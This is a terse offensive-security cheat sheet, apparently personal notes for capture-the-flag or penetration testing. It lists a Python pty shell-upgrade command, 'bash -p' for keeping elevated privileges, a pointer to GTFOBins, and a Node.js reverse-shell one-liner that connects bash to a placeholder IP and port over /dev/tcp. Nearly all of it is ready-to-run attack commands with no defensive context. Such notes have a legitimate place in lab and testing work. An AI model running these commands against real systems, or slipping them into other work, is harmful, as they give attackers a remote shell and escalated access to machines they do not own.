python3 -c "import pty;pty.spawn('/bin/bash')"

bash -p

CHECK GTFO BINS

REVERSE SHELL: 
Node.js
```shell
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/IP/Port 0>&1"')
```